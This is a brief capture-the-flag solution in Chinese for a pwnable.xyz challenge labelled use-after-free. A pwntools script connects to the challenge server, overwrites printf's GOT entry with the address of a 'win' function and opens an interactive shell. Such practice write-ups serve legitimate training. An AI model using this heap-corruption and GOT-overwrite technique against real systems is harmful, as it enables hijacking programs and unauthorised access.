### 分类

- UAF



不难，注意payload长度

### 脚本

```
from pwn import *

context.terminal = ['tmux', 'splitw', '-h']

e = ELF('./challenge')
printf_got = e.got['printf']
win_addr = e.symbols['win']

p = remote('svc.pwnable.xyz', 30030)
# p = process('./challenge')

p.sendlineafter(b'> ', b'1')
p.sendlineafter(b': ', b'40')
p.sendlineafter(b': ', b'a')
p.sendafter(b'note: ', b'a' * 0x20 + p64(printf_got)[0:7])

p.sendlineafter(b'> ', b'3')
p.sendlineafter(b': ', b'0')

p.sendlineafter(b'> ', b'1')
p.sendlineafter(b': ', b'9')
p.sendlineafter(b': ', b'a')
p.sendafter(b'note: ', p64(win_addr))

# gdb.attach(p)
p.interactive()

```

